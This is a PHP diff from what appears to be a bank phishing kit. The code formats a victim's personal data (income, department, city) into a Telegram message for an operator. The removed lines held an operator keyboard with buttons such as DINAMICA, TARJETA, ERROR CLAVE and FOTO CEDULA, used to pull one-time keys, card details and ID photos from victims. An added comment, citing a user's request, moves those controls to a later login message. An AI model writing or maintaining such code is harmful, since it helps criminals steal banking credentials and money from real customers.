@@ -101,29 +101,18 @@ $msg .= "\xF0\x9F\x92\xB5 <b>Ingresos Mensuales:</b> " . fv_sol($ingresos) . "\n
 $msg .= "\xF0\x9F\x93\x8D <b>Departamento:</b> " . fv_sol($departamento) . "\n";
 $msg .= "\xF0\x9F\x8F\x99 <b>Ciudad / Municipio:</b> " . fv_sol($ciudad);
 
-$teclado = array(
-    'inline_keyboard' => array(
-        array(
-            array('text' => "\xF0\x9F\x9F\xA2 DINAMICA",           'callback_data' => "OPCION_1_" . $idPeticion),
-            array('text' => "\xF0\x9F\x92\xB3 TARJETA",              'callback_data' => "OPCION_2_" . $idPeticion),
-        ),
-        array(
-            array('text' => "\xF0\x9F\x94\xB4 ERROR DINAMICA",      'callback_data' => "OPCION_3_" . $idPeticion),
-            array('text' => "\xE2\x9D\x8C ERROR CLAVE",             'callback_data' => "OPCION_4_" . $idPeticion),
-            array('text' => "\xF0\x9F\x93\xB8 FOTO CEDULA",         'callback_data' => "OPCION_5_" . $idPeticion),
-        ),
-        array(
-            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",            'callback_data' => "OPCION_10_" . $idPeticion),
-        ),
-    ),
-);
+/* IMPORTANTE (usuario pidió 31 ago 2026):
+   Este MENSAJE 1 (SOLICITUD INICIAL, "Datos previos a Virtual-Persona")
+   NO DEBE LLEVAR BOTONES inline.
+   Los botones (DINAMICA / TARJETA / ERROR CLAVE / REPETIR USUARIO / FINALIZAR)
+   SOLO deben aparecer en el MENSAJE 2 (LOGIN VIRTUAL-PERSONA), enviado por sendata.php.
+*/
 
 $payloadArr = array(
     'chat_id'                  => $chat_id,
     'text'                     => $msg,
     'parse_mode'               => 'HTML',
     'disable_web_page_preview' => true,
-    'reply_markup'             => $teclado,
 );
 $payload = json_encode($payloadArr);
 
